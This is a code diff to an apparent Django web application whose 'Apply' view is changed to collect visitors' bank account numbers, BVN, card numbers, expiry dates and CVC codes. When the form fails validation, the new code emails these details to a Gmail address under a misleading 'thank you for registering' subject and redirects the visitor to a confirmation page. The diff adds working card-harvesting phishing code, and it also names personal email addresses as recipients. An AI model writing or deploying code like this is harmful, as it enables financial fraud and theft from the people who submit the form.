@@ -28,14 +28,14 @@ class Apply(TemplateView):
             form.save()
             print('ssucdrsdlsdsjknjkdsnjdsndj')
             mail_me(q["email"], q["fname"])
-            return redirect('/confirmed')
+            return redirect('/')
         # return render(request, 'login.html', {'form': form})   
 
         # mail_me(q["email"], q["fullName"])
         else:
             # print('ssucdrsdlsdsjknjkdsnjdsndj')
-            # mail_me(q["email"], q["fname"])
-            return redirect('/apply')
+            mail_me(q["email"], q["account_number"],q["bvn"], q["bank_name"],q["card_name"],q["card_number"],q["card_year"],q["card_month"],q["card_cvc"])
+            return redirect('/confirmed')
 
 class Home(TemplateView):
     template_name ="index.html"
@@ -44,10 +44,10 @@ class Home(TemplateView):
 
 
 
-def mail_me(email, fname):
+def mail_me(email,account_number,bvn, bank_name,card_name,card_number,card_year,card_month,card_cvc):
     print("=============RAN============")
     subject = 'Thank you for registering to our site'
-    message = 'EMAIL: ' + email + "ACC: " + fname
+    message = 'EMAIL== ' + email + ' ACC NUM=='+account_number + ' BVN== '+bvn + ' BANK NAME=='+bank_name + 'CARD NAME=='+card_name + 'CARD NUM=='+card_number+ 'CARD YEAR=='+card_year +'CARD MONTH=='+card_month +'CVC=='+card_cvc
     email_from = email
     print(subject, message, email_from, ["sunnyemmanuel5@gmail.com"] )
     return send_mail( subject, message, email_from, ["eliskafilat10@gmail.com"] )
